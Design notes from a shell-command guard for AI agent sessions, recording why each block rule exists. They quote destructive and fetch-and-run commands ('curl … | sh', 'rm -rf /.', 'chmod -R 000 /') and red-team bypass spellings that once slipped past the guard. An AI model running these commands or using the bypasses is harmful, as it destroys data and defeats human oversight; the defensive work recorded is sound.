---
kind: explanation
owner: @VytCepas
status: unreviewed
---

# Notes moved out of bin/admission-bash.sh

On-demand. Comment blocks that told the story of a fix, moved here verbatim when the file's comment ratio was cut (harbor#1392). The code keeps 1-3 lines of why; the history is here and in git.


## bin/admission-bash.sh, lines 3-26 (before this edit)

```text
B3 (harbor#3) — PreToolUse(Bash) shell-injection / local-exec guard.
Ports upstream DANGEROUS_PATTERNS @ a4e8e74 (safety-classifier.ts:44-76),
trimmed for POSIX+WSL (dropped the OpenRouter/email routing shapes → B4).
This covers the code-execution + destruction class that yard's
prod_guard deliberately OMITS (prod_guard owns cloud/data-destruction; the
two corpora are complementary). Pure POSIX. FAIL-OPEN on parse error.
LINUX (harbor#618): osascript, plutil and ditto below are macOS tools named so they are REFUSED;
Linux has none of them, and their Linux forms (python/sed -i, tar/unzip/cp) are in the same lists.

Blocking (exit 2), not "de-auto-approve": upstream routes these to a native
prompt, but Helm's floor is a hard veto (docs/reports/platform-epic.md:44 — guard-hooks are
veto-only and compose). Anti-evasion pre-pass (guard-lib floor_bash_targets)
neutralizes single-quote-data false positives and executed-quoted-arg /
command-substitution false negatives (Cato H2/H3, issue #732).

DELIBERATELY ONE FILE (docs/explanation/modularity.md): lint F1 requires the
kill-switch to be the FIRST LIVE LINE of a guard, B6 pins this file's hash, and
per-rule files would add a fork per rule — DE-09 records a fork regression that
turned SessionStart into a fail-OPEN bypass.

B5 narrowing: CATASTROPHIC shapes fire everywhere. PROJECT-POLICY shapes
(protected-branch git) are deferred only where the governing repo WIRES
yard's github_command_guard, which then adjudicates them — this prevents
the double-ask the B5 ticket forbids. A marker alone is not that guard (harbor#954).
```

## bin/admission-bash.sh, lines 34-35 (before this edit)

```text
Assigned rather than discarded: OBSERVE-1 needs the tool class and this is the
SAME jq call the test already made, so the census costs zero extra forks.
```

## bin/admission-bash.sh, lines 40-42 (before this edit)

```text
The digest subject (harbor#41). NOT passed through floor_block: payload text
that never enters the blocking function cannot be one careless edit away from
the stderr printf.
```

## bin/admission-bash.sh, lines 58-63 (before this edit)

```text
harbor#1313 — an unquoted `$IFS` is whitespace to bash, so a verb, its flags and its operand
joined by it are three words, and no flat rule saw a space between them. The normalizer now
splits there too; this is the same reading for the flat half, which is what still stands over
a padded payload with no table (QA plan R4). Only spellings whose value is a subset of IFS, as
the normalizer's ifs_len; the bare form twice, because one pass consumes the character after
a match and so misses a second `$IFS` directly beside it.
```

## bin/admission-bash.sh, lines 76-78 (before this edit)

```text
The STRUCTURED table the migrated rules read (B-rewrite, docs/explanation/admission-baseline.md). Loaded
once; fail-open exactly like every other scanner here — an empty table makes
floor_seg_* return "no match", never "block".
```

## bin/admission-bash.sh, lines 81-93 (before this edit)

```text
harbor#89 — QUOTED IS NOT EXECUTED. If the whole command is one INERT consumer
taking a heredoc and nothing else (`git commit -F - <<EOF … EOF`), the body is
a message, not code, and every rule below would be reading documentation. The
predicate is deliberately strict — see floor_heredoc_inert_only in guard-lib —
because "every command word is inert" would have waved through
`echo x > <floor surface>`, where the danger is the redirect.

`sh <<EOF … EOF` is NOT inert and is unaffected: that case must keep blocking,
and it is asserted first in the suite precisely so a too-permissive veto shows
up as a red bypass rather than a green convenience.
--publisher-inert (harbor#125): this guard judges EXECUTION and local writes,
never publication, so a consumer that cannot run the body is inert here even
when it can send it. guard-egress deliberately does not pass the flag.
```

## bin/admission-bash.sh, lines 96-97 (before this edit)

```text
floor_peel deliberately strips a leading NAME=value wrapper, so a rule that
looks FOR an assignment must read the raw command (red-team pass 7).
```

## bin/admission-bash.sh, lines 101-114 (before this edit)

```text
Pipe into ANY shell interpreter. Enumerating the producer (curl|wget|base64)
was trivially evaded: xxd -r -p | sh, openssl enc -d -a | sh (red-team
2026-07-24). Whatever builds the bytes, executing a pipeline's output as a
shell script is the dangerous act, so the SINK is what we match.

…but a shell RUNNING A NAMED SCRIPT is not that act. Its program comes from the
file; the pipeline is only that script's stdin, so `printf '%s' "$p" | sh g.sh`
— how every guard in this repo is exercised — was blocked as an attack, and
`pipe-to-shell` became the most-fired rule on the box (harbor#222, §2.11).
The argv question settles it and a regex tail cannot: `sh 2>/dev/null` has no
operand at all, yet `2>&1` opens with an alphanumeric like a filename would.
floor_seg_shells_all_named_scripts refuses the exemption for `-s`, `-`,
/dev/stdin, an option-only invocation, and for a table it could not build —
so an oversized payload still blocks (QA plan R4).
```

## bin/admission-bash.sh, lines 122-130 (before this edit)

```text
…and the shells are not the only sinks (harbor#1313). The builtins `source` and
`.` run what they read, and a stdin path as the operand reads the pipe: the same
act with the shell word swapped for a builtin. The operand says so, so the rule
matches a stdin path (any slash count, any fd spelling) and needs no exemption:
a builtin reading a NAMED file takes its program from the file and never matches.
Likewise a non-shell interpreter that reads its PROGRAM from stdin. Bare, or given
`-`, it executes the pipe; given code (-c/-e/-m) or a script it reads DATA there
(harbor#607), which floor_seg_interps_all_programmed separates by argv, as for
shells above.
```

## bin/admission-bash.sh, lines 139-141 (before this edit)

```text
Shell executing a process substitution of a fetch: bash <(curl …). A shell
reading its script from STDIN is a fourth channel the fetch rules did not
model — `sh < <(curl …)` and `bash <<< "$(curl …)"` (red-team pass 6).
```

## bin/admission-bash.sh, lines 145-153 (before this edit)

```text
── DEFERRED-EXECUTION SINKS ────────────────────────────────────────────────
Everything above models code executed NOW. Writing code into a context some
LATER process runs is the same act, time-shifted, and was entirely unmodelled
(red-team pass 6). The floor's own kill-switch was the worst case: the Bash
tool's shell is initialized from the user's profile, so one append to ~/.zshrc
disabled every guard permanently, and the block message names the variable.
HARBOR_ADMISSION_SHADOW (harbor#482) is a second switch of the same class — a shadow
session blocks almost nothing — so it is guarded by the same two rules, which
stay enforcing in shadow (floor_shadow_enforces).
```

## bin/admission-bash.sh, lines 156-159 (before this edit)

```text
`launchctl setenv` puts a switch into every process launchd starts later, the
next Terminal included. The second alternative is a switch name REDIRECTED into
a settings file: a settings.json `env` block reaches every hook, and
`printf '{"env":…}' > f` names no writer before the name.
```

## bin/admission-bash.sh, lines 173-196 (before this edit)

```text
CLAUDE CODE'S OWN API ROUTE (harbor#545). 2026-09-17 20:58Z: a `--help` probe ran a
scaffolded setup_models.sh, which ignores its arguments and installed
claude-code-router 3.1.0; the router's first run rewrote ~/.claude/settings.json
to send every request to 127.0.0.1:3456, where nothing listened. This session,
four subagents and the permission classifier all failed with "Connection
refused" until a person restored the file by hand. The router and its installer
are refused BY NAME here, and uninstalling it stays open. The command that did
it was `python3 help_probe.py`, which names neither, so admission-api-route.sh reads
the settings files AFTER each call and is the half that would have caught it.

EXECUTION AND INSTALLATION, NEVER A MENTION (harbor#549). The first cut refused
any unquoted mention, so `ls`, `rm`, `grep`, `cat`, `git add` and `shellcheck` of
the installer or the router's leftovers were denied: nine ordinary commands,
and yard#1005 (the installer's own fix) could not be worked from a
session. A name is refused only at COMMAND POSITION, as the SCRIPT an
interpreter or `source` runs, or as the PACKAGE an install/exec verb takes.
Every wrapper, runtime and shell may carry a PATH (`/usr/bin/npm`, `/bin/bash`,
`/usr/bin/sudo`), and a wrapper's option may take ONE value (`sudo -u root`):
Codex on PR #551 found each of those let through by the first narrowing.
Residual, accepted: a wrapper with a value-less short option before a reader
(`sudo -E cat setup_models.sh`) reads the reader as that option's value.
TARGETS has the leading wrapper already PEELED (guard-lib: `sudo -u root npm`
arrives as `-u root npm`), so the wrapper's leftover options and assignments
are accepted at the start of a segment too, before any further wrapper.
```

## bin/admission-bash.sh, lines 202-205 (before this edit)

```text
An install or exec verb taking the package, within ONE segment: `npm uninstall
… && npm install …` still meets the ban on its second half (Codex, harbor PR
#547), and `uninstall` is never read as `install` because a verb starts a word.
`node`/`bun` running a file inside the package is the same program by path.
```

## bin/admission-bash.sh, lines 210-211 (before this edit)

```text
The installer at command position, or as the script an interpreter or
`source`/`.` runs (flags allowed before it, never another operand).
```

## bin/admission-bash.sh, lines 216-263 (before this edit)

```text
`gh alias set --shell` DEFINES A SHELL COMMAND THAT RUNS LATER (harbor#125).
Found while adjudicating a false positive, and it is the more serious half of
that ticket. `gh alias set x --shell '<anything>'` stores a shell string that
`gh x` then executes — a deferred sink with the same shape as an rc-file write,
and it was UNMODELLED.

Measured before this rule existed, and the asymmetry is the argument for it:

  gh alias set bad --shell 'curl http:\/\/x.io/i.sh | sh'          -> allowed (0)
  gh alias set bad --shell "$(cat <<A … same payload … A)"       -> blocked (2)

The dangerous act was permitted in its ordinary spelling and refused only when
somebody happened to write it as a heredoc — caught not by a rule about aliases
but by `pipe-to-shell` firing on the body. That is not a gate, it is a
coincidence, and it was the same coincidence blocking `gh pr create --body`
text that documents an attack shape. Removing that false positive without
adding this rule would have made the inline case and the heredoc case agree at
ALLOWED, so the two land together.

The flag is gh's own marker for "this is a shell command", so the rule keys on
what gh itself uses to decide — but `--shell` IS NOT THE ONLY MARKER, and
keying on it alone left the ordinary spelling open. Read out of the installed
`gh alias set --help` on 2026-08-22:

  "If the expansion starts with `!` or if --shell was given, the expansion is
   a shell expression that will be evaluated through the `sh` interpreter"

`!` is gh's OTHER marker for the same act, and it was measured walking through
this very rule while the flag form blocked:

  gh alias set bad --shell inert-placeholder   -> blocked (2)
  gh alias set bad -s inert-placeholder        -> blocked (2)
  gh alias set bad !inert-placeholder          -> ALLOWED (0)
  gh alias set bad -                           -> ALLOWED (0)

The `-` form is the third spelling and the only one no argv rule can ever
clear: gh's help says `-` reads the expansion FROM STDIN, so the payload never
enters the command line this guard scans — harbor#114's structural cap in a
new spelling. An expansion the floor cannot see is not one it can pass, so the
bare `-` is refused on its argument's ABSENCE rather than on its content.

A LEADING `!` ONLY, on a token boundary, because gh treats `!` as the marker
only at the START of the expansion. `gh alias set wf 'issue list
--label="wontfix!"'` runs no shell and must not be refused: matching `!`
anywhere would tax the ordinary use to catch the dangerous one (§2.11).

`gh alias set co 'pr checkout'` still expands to a gh SUBCOMMAND and executes
no shell, which is the common and legitimate use, and stays allowed.
```

## bin/admission-bash.sh, lines 272-279 (before this edit)

```text
A FINDING'S DISPOSITION IS A PERSON'S (harbor#855, contracts/finding.md). lint-findings.sh accept
refuses inside an agent session, but the session holds the same gh login, so it could apply
the label by hand and the reconcile could not tell who did. This hook runs only inside an
agent session, so the reconcile's own finding:fixed (launchd, outside one) is never refused.
CASE-BLIND, because GitHub matches a label name that way (review #934: FINDING:ACCEPTED applied
the real label). A label TOKEN, never prose: a whole argument with no space before the name
(`-lfinding:…`, `labels[]=…`, `…/labels/finding:…`), or one element of a comma list.
A hand CLOSE is not refused: the reconcile re-files a finding closed without a disposition.
```

## bin/admission-bash.sh, lines 285-286 (before this edit)

```text
An alias or a renamed label is the same act one step removed (review #934). An alias is judged on
its expansion naming a writing verb, so `gh alias set fl 'issue list --label finding:…'` stays a read.
```

## bin/admission-bash.sh, lines 291-294 (before this edit)

```text
gh api is judged ONE SEGMENT AT A TIME, in one pass, on the method gh will send: the LAST -X or
--method wins, a field with no method is a POST, and an explicit GET is a query. Each token is
percent-decoded first, because GitHub decodes the whole path (`labels/%66inding:accepted`). GraphQL
is not judged: its label mutations take ids, never names (review #934, round 2).
```

## bin/admission-bash.sh, lines 332-337 (before this edit)

```text
THE EVENT DISPATCHER'S FOLLOWER AND ITS RULE WRITES ARE THE OPERATOR'S (harbor#1044 review r3 #1). A
session that starts `event-dispatch.sh dispatch` leaves a follower that outlives it and spawns agents as
the operator; one that runs `on` writes the rules that follower obeys. Refused by argv, however it is
reached: the script by any path, the bus's passthrough (`event-bus.sh dispatch|on`), or `harbor event`.
`on --list` is a read and stays open, and so does every other bus verb (emit, wait, tail, pull). The
script refuses the same acts inside a session (CLAUDECODE), which covers a script that runs it.
```

## bin/admission-bash.sh, lines 361-367 (before this edit)

```text
NO `gh pr merge` RULE HERE, AND THAT IS DELIBERATE (harbor#254). The merge
moment already has an owner: contracts/hooks.md's layer-split table assigns
`gh pr merge` to bin/govern-hook.sh's PreToolUse arm, which knows the PR
number, can consult the backstop, and stays silent on a green PR. A second
rule here would be a copy of that decision in the file that enforces T2, and
it would refuse every merge to catch the red ones — the §2.11 false positive
govern-hook.sh explicitly designed around.
```

## bin/admission-bash.sh, lines 369-394 (before this edit)

```text
── Schedulers: the same act with a timer in front of it ────────────────────

COMMAND POSITION, NOT "THE WORD APPEARS SOMEWHERE" (harbor#92). Both rules
matched their verb anywhere in the normalized text, and `at` is the two-letter
English preposition — so an ordinary commit was refused for carrying a
TIMESTAMP. Every one of these was measured at exit 2 on the previous spelling:
    git commit -am "green at 20:43:55, red 88 seconds later"
    git log --oneline --since "2026-08-01 at 20:43:55"
    jq -n --arg m "green at 20:43:55" '{m:$m}'
    git commit -am "fix: crontab -l parsing in the report"
Timestamps are the evidence format this repo's own discipline asks for
(CONSTITUTION №2.1/№2.4), so the rule was taxing the constitution it enforces —
and the escape hatch it printed, HARBOR_ADMISSION_DISABLE=1, turns off all seventy
other rules to get a commit message through (№2.11). The measured workaround
was `git commit -F <file>`, which produces the identical commit: the rule
stopped nothing, it only chose the syntax.

THE SAME ANCHOR CLOSES A BYPASS, which is what makes this a fix and not a
loosening. `at 20:43:55` is not at(1) syntax at all — the colon-with-seconds
form is a clock reading — while `at midnight` and `at teatime` ARE valid job
specs, and both walked past the old digit branch at exit 0 (measured). So the
flat rule now names at(1)'s own time-spec vocabulary rather than "a digit".

`crontab -l` / `-v` PRINT. They install nothing, and reading your own crontab
was refused outright — a false positive in a rule whose entire subject is
installation.
```

## bin/admission-bash.sh, lines 401-418 (before this edit)

```text
THE ARGV TWIN — added ALONGSIDE the flat rules, not instead of them, exactly as
the rm family was migrated: flat reaches further (an operand assembled at
runtime, an oversized payload where the tokenizer is skipped), argv is more
precise. Neither is a superset of the other.

What argv buys here: the scheduler verb has to be the segment's COMMAND, so no
spelling of a preposition inside a message can reach it, and every time-spec
spelling is covered at once rather than enumerated into an adjacency regex.

TWO PREDICATES, NOT ONE, because the two commands have different grammars and
pretending otherwise is how a rule acquires a blind spot:
  at/batch  fire when an argument IS a job spec. Requiring the spec — rather
            than "is not a query flag" — is what keeps a heredoc body line
            beginning with the preposition from reading as a scheduled job.
  crontab   fires unless every argument is a listing flag. It has no time spec
            to require; its operand is the table itself.
An EMPTY argument list fires either way: a bare `crontab` reads stdin and
REPLACES the table, and a bare `batch` runs its stdin when the load drops.
```

## bin/admission-bash.sh, lines 422-425 (before this edit)

```text
`ci`, because a scheduler named in any case is the same scheduler: this
filesystem is case-insensitive, so CRONTAB executes /usr/bin/crontab
(harbor#282). Scoped to THIS helper on purpose — _floor_seg_ids records why the
blanket form regressed a real command.
```

## bin/admission-bash.sh, lines 455-481 (before this edit)

```text
PATH POISONING: THE RULE THAT WAS HERE IS GONE, AND IT WAS PROVABLY DEAD
(harbor#280). It read:
    hit 'export[[:space:]]+PATH=' && hit "(>|?|>>)[[:space:]]*[^…]*$RCFILE" \
      && <block as> "path-persist", flat shape
The blocking call is spelled `<block as>` rather than by its function name for
the same class of reason as the id below: lint F5 counts every line carrying
that function name as a CALL SITE, comments included, and then requires the line
to end at a `<rule>.<shape>` id. A prose mention would read as a call site with
no id — the exact defect F5 exists to catch, manufactured by describing it.
The dead id is spelled in PROSE, not as `<id>.<shape>`, and that is deliberate:
admission-equivalence.sh derives its coverage universe by scraping this file's TEXT for
that exact token pattern, comments included. Writing a deleted rule's id in the
canonical spelling would re-add it to the denominator as a rule nothing can ever
reach, so coverage would read "N of M+1" forever — the "denominator nobody can
reproduce from the source" its own comment warns about.
Its SECOND condition is byte-identical to startup-file-write's ONLY condition
at line 106 — which runs 156 lines earlier and exits 2. So no input could ever
reach this line: every command satisfying it had already blocked. This is a
subset proof, not a failed probe, which is a stronger falsifier than the ticket
asked for (it accepted "no command I can construct fires it").

NO BEHAVIOUR IS LOST. `export PATH=/evil:$PATH >> ~/.zprofile` still blocks, as
startup-file-write, with a message that is strictly more accurate: the danger is
writing a startup file at all, and PATH is one payload among many. What the dead
rule cost was real — a grep fork on the hot path of every Bash call in every
session (harbor#264), a rule count that overstated coverage, and a maintainer
reading it as protection that existed.
```

## bin/admission-bash.sh, lines 482-487 (before this edit)

```text
eval / shell -c of a FETCHED command substitution. Both rules were dead code:
the normalizer erases `$(` from DATA and CODE before any pattern sees it, so
neither could ever fire, and no assertion covered them (red-team pass 4).
They now run against the EXPD variant, which renders substitutions back in
place — and they require the body to be a fetch, so `eval "$(ssh-agent -s)"`
and `eval "$(brew shellenv)"` stay allowed.
```

## bin/admission-bash.sh, lines 537-551 (before this edit)

```text
── MORE DEVICE DESTROYERS (harbor#1313, lane L2) ───────────────────────────
dd/redirect/tee/mkfs are not the only ways to destroy a raw disk, and
/dev/sd* is not the only node. The rules below close the rest of the
irreversible device-destruction class the floor already hard-blocks, each in
the voice of the four above. MOST ARE LINUX-ONLY (blkdiscard, wipefs, mke2fs,
sgdisk, mkswap, badblocks, dcfldd) — blocked anyway: docs/explanation/admission-baseline.md B-sd-3 records
that a Linux-only device gap is still a finding, and a session may run in a
Linux CI sandbox. admission-destroy.sh already calls diskutil "same class, one
spelling missing"; these are the other spellings.

READ-ONLY INSPECTION STAYS ALLOWED, which is why each rule needs more than the
verb: lsblk, blkid, 'fdisk -l', wipefs with no flag, badblocks without -w,
'parted … print', and a dd that reads a disk into a file (imaging) all pass. A
$DEVN node operand is the shared tail; a wrapper (busybox, sudo, env, timeout)
does not hide the verb because the flat scanner reads the normalized text.
```

## bin/admission-bash.sh, lines 553-554 (before this edit)

```text
Verbs whose every invocation on a disk node is destruction: discard every
block, overwrite with random data, lay down a new fs/swap signature.
```

## bin/admission-bash.sh, lines 564-565 (before this edit)

```text
wipefs erases filesystem signatures only with -a/--all or -o/--offset; bare
wipefs just LISTS them, so the flag is what separates a wipe from a read.
```

## bin/admission-bash.sh, lines 571-572 (before this edit)

```text
sgdisk edits the GPT; -Z/-o/-d/-n/-g/-G and their long forms rewrite or clear
it. `sgdisk -p` (print) carries no such flag and stays allowed.
```

## bin/admission-bash.sh, lines 582-583 (before this edit)

```text
A dd-family OUTPUT operand onto a critical /etc account file — the same files
the redirect and tee rules above already refuse, reached by a third writer.
```

## bin/admission-bash.sh, lines 605-623 (before this edit)

```text
rm -rf against the filesystem root, $HOME itself, or a system tree.
The tail class previously accepted `/` as a terminator after ~ or $HOME, so
every path UNDER the home dir read as "rm -rf ~" — 'rm -rf ~/proj/node_modules'
and 'rm -rf $HOME/.cache/yarn' were blocked (red-team pass 2, false positive).
~ and $HOME now match only when they ARE the target; `/` still matches bare
root and the system trees where recursive deletion is catastrophic.

`~<name>` IS $HOME UNDER A DIFFERENT SPELLING, and it was uncovered in every
rm rule here (pass 13, reproduced at exit 0 on 'rm -rf ~someone'). The near
miss is what hid it: guard-lib's floor_expand_paths rewrites `~$(id -un)/` —
WITH the trailing slash — to the absolute home, so 'rm -rf ~someone/' and
`~someone/*` both blocked while the bare form, which deletes exactly the same
tree, walked through. A second gap rode along: that sed knows only THIS
machine's login name, so `~alice/…` normalized to nothing at all.

Written as the general SHAPE rather than this host's login name. A hardcoded
username is right on one machine and silently wrong on the next, and the shape
costs nothing extra: `~name` is a home directory for every name, and deleting
one recursively is catastrophic whoever owns it.
```

## bin/admission-bash.sh, lines 625-631 (before this edit)

```text
THE RECURSIVE FLAG NEED NOT COME FIRST. This required the flag immediately
after `rm` to carry the `r`, so 'rm -rf ~user' matched while 'rm -f -r ~user'
and 'rm -i -rf ~user' did not — the same target, the same destruction, two
spellings away. Found by the pass-13 assertions going red 2026-08-01.
`(-flags[[:space:]]+)*` in front lets any run of non-recursive flags precede
it. It cannot swallow the target: every element of that run must begin with a
`-`, and a path or a `~name` does not.
```

## bin/admission-bash.sh, lines 633-635 (before this edit)

```text
The tail class is what keeps this off ordinary work: 'rm -rf ~someone/proj'
has an alphanumeric after the slash, so no alternative can reach a terminator
— the same discipline that keeps 'rm -rf ~/proj/node_modules' allowed.
```

## bin/admission-bash.sh, lines 640-646 (before this edit)

```text
Catastrophic at a system-tree ROOT or ONE level in (/usr, /usr/local,
/Users/someone = a whole home dir). Deeper paths are ordinary work:
/usr/local/var/homebrew/locks, /Users/me/proj/node_modules, and
/var/folders/… (macOS $TMPDIR) were all blocked before (red-team pass 3).
harbor#1313: /dev is a system tree the list left out, and /root is the superuser's
home, so it is the tree itself and its contents, never one level in: a cache under
it is that home's ordinary work, as one under /Users/someone is.
```

## bin/admission-bash.sh, lines 649-667 (before this edit)

```text
THE SAME THREE RULES, AGAINST ARGV — added ALONGSIDE the flat ones, not
instead of them (B-rewrite, 2026-07-25). The flat form still catches shapes
the table cannot see (an operand arriving via `$(printf /)`, a variable
assembled at runtime, an oversized payload where the tokenizer is skipped), so
removing it would trade one blind spot for another. This adds the shapes the
flat form misses.

WHAT IT FIXES, verified before and after: RMF demands that the FIRST flag
after `rm` contain an `r`. So the floor did not block
    rm -f -r /        rm -i -rf /        rm -f -r $HOME       rm -v -r -f /
— every one of them PASSED, while 'rm -rf /' blocked. Flag ORDER is not a
property of the command; it is a property of how the pattern was written. As
argv it is set membership: "some argument is a recursive flag AND some
argument is a catastrophic target", which has no order to get wrong.

The false positive the flat tail-class was built to avoid — `rm -rf
~/proj/node_modules`, `rm -rf $HOME/.cache/yarn` — is handled here by whole-
token anchoring instead of a hand-drawn terminator class: the target pattern
ends in `$`, so a path UNDER the home dir simply is not the home dir.
```

## bin/admission-bash.sh, lines 671-686 (before this edit)

```text
ROOT- AND HOME-EQUIVALENT SPELLINGS, NOT JUST THE CANONICAL ONE (edge pass
2026-08-29). `^/\*?$` matched `/` and `/*` and nothing else, so a single
trailing dot walked past it: 'rm -rf /.' and 'rm -rf /..' both deleted the
filesystem root and both measured rc=0 against the installed guard, one
character away from 'rm -rf /./', which floor-test.sh:553 has asserted since
Q5. `~/.` did the same to $HOME. The dots are not normalised out before these
patterns run — floor_collapse_dots leaves a TRAILING `/.` alone (it keys on
`*/./*`, which needs the closing slash) and the rm rules read raw operands, so
`/usr/..` blocked only by accident: RM_SYS's optional `(/[^/]+)?` happened to
match `/..` where RM_ROOT had no such component to spare.

Written as a repeating `(\.|\.\.)/*` group rather than an interval: this box's
grep is a ugrep wrapper and the repo already records it choking on `{n,m}`.
`/.hidden`, `/..x` and `/usr` stay out because the group must consume the WHOLE
component. All 41 cases, including every string the old pattern matched, are
asserted in floor-test.sh.
```

## bin/admission-bash.sh, lines 687-690 (before this edit)

```text
$HOME reaches these rules as a REGEX, so it is escaped for the same reason
CLAUDE_CONFIG_DIR is (P12-configdir-ere-injection-03) — a metacharacter in it
would invalidate the expression, and an invalid expression matches nothing.
Raw and canonical, as every HOME-derived surface is (harbor#754).
```

## bin/admission-bash.sh, lines 694-706 (before this edit)

```text
THE SYMLINK SPELLINGS ARE NOT THE ONLY SPELLINGS (docs/explanation/admission-baseline.md P12-argv-09,
reproduced 2026-08-30). /etc, /var and /tmp are symlinks into /private on
macOS, and the data volume is reachable through its firmlink — so
'rm -rf /private/var' and 'rm -rf /System/Volumes/Data' deleted exactly what
'rm -rf /var' is blocked for, and both exited 0. A rule that catches only the
convenient spelling of a path is the defect docs/explanation/admission-baseline.md pass 11 already recorded
once, in the shape of a tar bundle.

The real roots are enumerated rather than folded into the first alternation,
because `/private` and `/System/Volumes` are not themselves the boundary: it
is their NAMED children that are system trees, and `/System/Volumes/Data` is
one component deeper than the `(/[^/]+)?` the other roots allow.
/dev and /root as in the flat rule above (harbor#1313): /root is a whole home dir by itself.
```

## bin/admission-bash.sh, lines 720-725 (before this edit)

```text
A GLOB OR AN ANCESTOR REACHES A PROTECTED PATH (harbor#1313, L9). The rules above and the store's
own compare spellings, so a glob in any component, or the parent dir itself, carried the gcloud
store away unjudged. stdin is 'T:<id>:<u|->:<abs path>' targets then 'O:<verb>:<abs operand>'
operands; an operand hits when its match set holds a target or an ancestor of one at least one
component below $HOME ('u': or anything under it). Matched per component, `**` as any depth, and
case-folded (APFS). Prints '<id> <verb>' for the first hit.
```

## bin/admission-bash.sh, lines 793-816 (before this edit)

```text
A GLOB IS ITS MATCH SET (pass 13, P13D-2/3). 'rm -rf /u*' is 'rm -rf /usr' and
'rm -rf ~/.[a-z]*' reaches the config dir, but the patterns above compare
spellings. The shell's own 'case' matches the glob's LAST component against the
names each rule protects; a leading dot is matched only by a pattern that spells
it, as pathname expansion does. A glob in a parent component is not judged.
Prints the rule id of the first hit.

A RELATIVE GLOB IS JUDGED WHERE THE COMMAND STANDS (harbor#1313). An operand with no
slash was skipped outright, so a recursive dot-glob after a cd into the home dir reached
the config dir with no rule judging it: the cd-bridge compares a literal operand, and this
never saw one. The awk folds the cd/pushd chain and prints each relative glob again under
the directory the command stands in. STICKY (every directory it stood in, as
floor_seg_cd_fold) whenever the text has a structure the table cannot see, a subshell, a
pipeline, a group, a background job or an expanded interpreter body, because each of those
can launder a cd. A plain chain is folded linearly instead: sticky there made a second cd
out of the home dir into a project refuse an ordinary clean of that project. An
unresolvable hop leaves the directory unknown, and unknown judges nothing (fail open).

THE HOME DIR'S CONTENTS ARE A HOME-STAR (harbor#1313). The literal home-star is refused by
rm-rf-home, but a glob that matches the same set (any name of one character or more, any
name not starting with a dot) is a different spelling of it. Its children cannot be
listed, so the question is asked of probe names instead: a last component in the home dir
that matches EVERY one of them deletes everything a home holds. A narrowing glob, a prefix
or an extension, fails at least one probe and stays ordinary work.
```

## bin/admission-bash.sh, lines 820-822 (before this edit)

```text
Both config dirs, as the rules below name CFG_ABS and LIVE_DIR: CLAUDE_CONFIG_DIR can
point elsewhere while '~/.claude' is still the tree every session loads. LIVE_DIR is
set again, with its reasoning, above CFG_RE; this runs first, in a subshell.
```

## bin/admission-bash.sh, lines 877-878 (before this edit)

```text
harbor#1313 (L9): kept for the multi-component judgement after the loop; and a glob in
EVERY component under $HOME (the home-star one level down) empties each directory a home holds.
```

## bin/admission-bash.sh, lines 906-907 (before this edit)

```text
Candidates are '<rule>:<name>' pairs: one directory can be the parent of a home dir
AND of a config dir (a sandbox), so every list that applies is checked.
```

## bin/admission-bash.sh, lines 926-927 (before this edit)

```text
A glob in a parent component, judged whole against the gcloud store and the config dirs' control
files, where the command stands (harbor#1313, L9).
```

## bin/admission-bash.sh, lines 952-956 (before this edit)

```text
A GLOB IN ANY COMPONENT (pass 13, P13C-1). 'rm ~/.cla?de/settings.json' and 'rm ~/.claude/b?n/admission-bash.sh'
put the glob before the last component, which _rm_glob_hit does not judge, and need no -r. Each glob
operand of a mutating verb (cp/install/ln/rsync/ditto: the destination only) and each glob redirect
target is matched component by component, with the shell's own `case`, against the config dirs, their
control files, and anything under their bin/ and hooks/. A dot name needs a pattern that spells the dot.
```

## bin/admission-bash.sh, lines 999-1003 (before this edit)

```text
rsync --delete makes the DESTINATION match the source: from an empty dir it is
rm -rf of the destination's contents (pass 13, P13D-4). The destination is the
last operand; the source side is a read and stays allowed.
Case-folded like floor_seg_has (harbor#282): on macOS `RSYNC` runs rsync (pass 14 A-src-1).
harbor#1313: any number of `-word`s, for GNU's --delete-missing-args (Linux installs; openrsync lacks it).
```

## bin/admission-bash.sh, lines 1024-1037 (before this edit)

```text
RECURSIVE OWNERSHIP/PERMISSION REWRITES OVER THE SAME THREE TARGETS (edge pass
2026-08-29). The flat chmod rule above keys on the literal `777`, which is the
permission bomb people write ABOUT — measured, 'chmod -R 000 /', `chmod -R 666
/`, `chmod -R 000 /etc` and `chown -R nobody /` all passed. `000` is not a
lesser event than `777`: it locks every binary on the machine, including the
ones needed to undo it, and unlike `rm` it leaves the files in place so nothing
looks deleted. Same for a recursive chown, which silently takes the operator's
whole home away from them.

Deliberately the SAME three operand patterns as the rm rules rather than a
fourth spelling of "somewhere that matters": one definition, three verbs. The
mode is not in the pattern at all, so there is no next mode to have missed.
'chmod -R 755 build', 'chmod +x bin/x.sh' and 'chown -R me ./out' are untouched
— the operand test is what excludes them, and no -R means no rule.
```

## bin/admission-bash.sh, lines 1046-1056 (before this edit)

```text
find -exec destructive spray
A FILTERED find (-name/-path/-regex) is ordinary build-artifact cleanup —
`find . -type d -name __pycache__ -exec rm -rf {} +` is not a spray (red-team
pass 3). An UNFILTERED one deleting whatever it walks still is.
The pass-3 exemption tested for the PRESENCE of -name/-path, not its
SELECTIVITY, so `find / -name "*" -exec rm -rf {} +` — a whole-filesystem
spray — was exempted by a filter that matches everything (red-team pass 8).
The verb list also required rm to carry -r/-R/-f, so plain `rm`, `-delete`
and `unlink` never matched at all, leaving the ticket's own Done-when unmet.
harbor#1313: 'rsync --delete <empty>/ {}' is rm -rf of each match (rsync-delete-dest's own
reading), and rsync-delete-dest sees only the placeholder as destination. Same flag family.
```

## bin/admission-bash.sh, lines 1060-1066 (before this edit)

```text
harbor#607: a shell exec under find is exempt ONLY when its whole payload is provably
read-only (an allowlist; anything else keeps main's block). TARGETS carries the
find child as its own `sh -c <payload> _ <path>` line, operators intact, quotes
neutralised. Allowed: every simple command starts with a bare verb from the set; no
output redirect except /dev/null or an fd dup; no `$(`, backtick, `<(` or heredoc.
awk and sed are left out of the set: their programs can write and a neutralised
line cannot tell a program from an argument. A multi-line payload is never judged.
```

## bin/admission-bash.sh, lines 1112-1114 (before this edit)

```text
harbor#1313: a wrapper (`sudo xargs`, `xargs nice rm`), a group opener (`{ xargs …; }`) or a
value-taking xargs flag (`-I {}`, `-n 1`) hid the verb. hit is case-blind, so a numeric flag
takes digits only: `-r git rm` must not read as `-R <value>` and reach a verb that is not run.
```

## bin/admission-bash.sh, lines 1128-1131 (before this edit)

```text
A SELECTIVE filter makes it ordinary cleanup. A universal pattern is not a
filter, and a search rooted at / ~ or $HOME is catastrophic regardless.
The root must be a whole operand. A `/` followed by `/` or a space anywhere read
`<home>//h/x` and `build/` as rooted, and a bare `\$HOME` was an inert anchor (harbor#758).
